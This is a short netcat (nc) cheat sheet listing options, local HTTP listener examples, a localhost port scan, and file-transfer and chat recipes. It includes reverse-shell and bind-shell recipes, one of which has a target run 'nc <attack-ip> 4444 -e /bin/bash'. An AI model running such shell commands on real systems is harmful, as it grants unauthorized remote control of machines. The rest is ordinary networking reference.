# nc(1)

netcat is a utility for reading from and writing to network connections using TCP or UDP

## Options

    -x                # hexdump incoming and outgoing traffic
    -l                # listen mode, for inbound connects
    -z                # zero-I/O mode (used for scanning)
    -p                # local port number
    -n                # skip DNS lookups
    -4                # use IPv4 only
    -6                # use IPv6
    -u                # use UDP instead of TCP

## Examples

    nc -l -p 80                                                             # listen on port 80 and print request: `curl localhost`
    nc -lvp 80
    printf 'HTTP/1.1 200 OK' | nc -l -c -p 80                               # listen on port 80, print request and return HTTP response: `open localhost`
    printf 'HTTP/1.1 200 OK\n\n%s' "$(cat index.html)" | nc -lcp 80
    printf 'GET / HTTP/1.0\n\n' | nc localhost 80                           # do HTTP request to localhost. same as `curl localhost`

## Netcat Port Scan

    nc -v -z localhost 1-1023                        # scan localhost for open lower ports (0-1024)
    nc -v -z -n 127.0.0.1 1-1023                     # scan 127.0.0.1 for open lower ports (0-1024)

## Netcat Reverse Shell

    attack > nc -lp 4444
    target > nc \<attack-ip> 4444 -e /bin/bash
    attack > env                                     # print env of "target"

## Netcat Bind Shell

    target > nc -lp 4444 -e /bin/bash
    attack > nc \<target-ip> 4444
    attack > env                                     # print env of "target"

## Netcat Chat Shell

    chat-1 > nc -lp 4444
    chat-2 > nc \<chat-1-ip> 4444

## Netcat File Transfer

    target > nc -lp 4444 > file.txt
    source > nc \<target-ip> 4444 < file.txt          # finish with `CTRL-C`
